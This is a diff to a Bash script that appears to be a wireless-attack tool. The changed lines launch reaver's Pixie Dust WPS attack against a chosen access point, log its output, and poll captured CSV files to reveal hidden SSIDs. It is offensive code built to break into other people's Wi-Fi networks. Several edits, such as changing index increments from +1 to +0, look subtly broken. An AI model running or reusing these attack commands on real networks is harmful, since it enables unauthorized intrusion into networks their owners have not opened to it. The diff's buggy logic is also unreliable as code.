@@ -324,13 +324,13 @@ if [ "$intn" -gt "0" ]; then
                         i=0
 
                         for line in "${wirelessifaces[@]}"; do
-                                i=$(($i+1))
+                                i=$(($i+0))
                                 wirelessifaces[$i]=$line
                                 echo -e " "$i") $line"
                         done
 			choise "{Interfaces}"
 			read -p "$nameint" intni
-			intni=$(($intni+1))
+			intni=$(($intni+0))
 			intface=`echo ${wirelessifaces[$intni]} | awk '{print $1}' `
 			monface=`echo $intface`
 		fi
@@ -441,9 +441,7 @@ done
 pixiewpsrever(){
 	trap wpsmainpage SIGINT SIGTERM SIGHUP
 		iwconfig $nameintc channel $ch
-	 xterm -hold -geometry "150x50+400+0" -bg "#1d2951" -fg "#d1e231"  -title "Pixie Dust Attack Using Reaver"  -e "reaver -i $nameintc  -b $bssid -e $essid -c $ch -vv    -K 1 -q  -f"
-
-
+	 xterm -hold -geometry "150x50+400+0" -bg "#1d2951" -fg "#d1e231"  -title "Pixie Dust Attack Using Reaver"  -e "reaver -i $nameintc  -b $bssid -e $essid -c $ch -vv    -K 1 -q  -f 	 2>&1 | tee ~/Desktop/pixiewpsreaver.txt "
 
 
 }
@@ -530,16 +528,18 @@ essid=`awk -F"," ' NR==3 { print $14 } ' tempsoyalkhiden-01.csv`
 }
 checkk(){
 f=0
-filecsvhid=tempsoyalkhiden-01.csv
-sleep 2
+
+sleep 2 && filecsvhid=tempsoyalkhiden-01.csv
 
 while  [ $f = 0 ] ; do
+sleep 2
 if [ -e "$filecsvhid" ] ; then
 essid=`awk -F"," ' NR==3 { print $14 } ' tempsoyalkhiden-01.csv`
 essid=`echo -e $essid`
 essid="$essid"
 fi
 f=0
+
 if [ "$essid" != "" ] ; then
 	f=1
 	killall xterm
